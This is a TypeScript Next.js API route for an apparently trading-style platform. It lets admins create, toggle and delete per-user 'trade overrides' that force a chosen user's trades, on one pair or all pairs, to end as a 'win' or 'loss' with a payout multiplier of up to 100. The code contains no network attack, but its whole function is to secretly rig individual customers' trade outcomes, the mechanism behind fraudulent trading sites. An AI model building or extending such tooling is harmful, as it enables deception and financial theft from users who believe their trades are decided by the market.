import { createClient, createAdminClient } from "@/lib/supabase/server"
import { NextResponse, type NextRequest } from "next/server"

async function verifyAdmin() {
  const supabase = await createClient()
  const {
    data: { user },
  } = await supabase.auth.getUser()
  if (!user) return { error: "Unauthorized", status: 401 }

  const adminSupabase = await createAdminClient()
  const { data: profile } = await adminSupabase
    .from("profiles")
    .select("role")
    .eq("id", user.id)
    .single()
  const isAdmin =
    profile?.role === "admin" || profile?.role === "super_admin"
  if (!isAdmin) return { error: "Forbidden", status: 403 }

  return { user, adminSupabase, role: profile.role }
}

// GET - list overrides for a user or all active overrides
export async function GET(request: NextRequest) {
  const auth = await verifyAdmin()
  if ("error" in auth)
    return NextResponse.json({ error: auth.error }, { status: auth.status })
  const { adminSupabase } = auth

  const userId = request.nextUrl.searchParams.get("user_id")

  let query = adminSupabase
    .from("trade_overrides")
    .select("*, profiles(email, full_name)")
    .order("created_at", { ascending: false })

  if (userId) {
    query = query.eq("user_id", userId)
  } else {
    // Only show active overrides when listing all
    query = query.eq("active", true)
  }

  const { data, error } = await query
  if (error)
    return NextResponse.json({ error: error.message }, { status: 500 })

  return NextResponse.json({ overrides: data ?? [] })
}

// POST - create or update an override
export async function POST(request: NextRequest) {
  const auth = await verifyAdmin()
  if ("error" in auth)
    return NextResponse.json({ error: auth.error }, { status: auth.status })
  const { adminSupabase } = auth

  const body = await request.json()
  const { action } = body

  // Create override
  if (action === "create") {
    const { user_id, pair, forced_result, multiplier } = body
    if (!user_id || !forced_result)
      return NextResponse.json({ error: "Missing fields" }, { status: 400 })

    if (!["win", "loss"].includes(forced_result))
      return NextResponse.json(
        { error: "forced_result must be win or loss" },
        { status: 400 }
      )

    const mult = multiplier ? parseFloat(multiplier) : 1.0
    if (isNaN(mult) || mult <= 0 || mult > 100)
      return NextResponse.json(
        { error: "multiplier must be 0-100" },
        { status: 400 }
      )

    // Deactivate any existing active override for same user+pair
    if (pair) {
      await adminSupabase
        .from("trade_overrides")
        .update({ active: false })
        .eq("user_id", user_id)
        .eq("pair", pair)
        .eq("active", true)
    } else {
      // Deactivate all overrides for this user with null pair (global)
      await adminSupabase
        .from("trade_overrides")
        .update({ active: false })
        .eq("user_id", user_id)
        .is("pair", null)
        .eq("active", true)
    }

    const { data, error } = await adminSupabase
      .from("trade_overrides")
      .insert({
        user_id,
        pair: pair || null,
        forced_result,
        multiplier: mult,
        active: true,
      })
      .select()
      .single()

    if (error)
      return NextResponse.json({ error: error.message }, { status: 500 })

    return NextResponse.json({ override: data })
  }

  // Toggle active status
  if (action === "toggle") {
    const { override_id, active } = body
    if (!override_id)
      return NextResponse.json(
        { error: "Missing override_id" },
        { status: 400 }
      )

    const { error } = await adminSupabase
      .from("trade_overrides")
      .update({ active: !!active })
      .eq("id", override_id)

    if (error)
      return NextResponse.json({ error: error.message }, { status: 500 })

    return NextResponse.json({ success: true })
  }

  // Delete override
  if (action === "delete") {
    const { override_id } = body
    if (!override_id)
      return NextResponse.json(
        { error: "Missing override_id" },
        { status: 400 }
      )

    const { error } = await adminSupabase
      .from("trade_overrides")
      .delete()
      .eq("id", override_id)

    if (error)
      return NextResponse.json({ error: error.message }, { status: 500 })

    return NextResponse.json({ success: true })
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 })
}
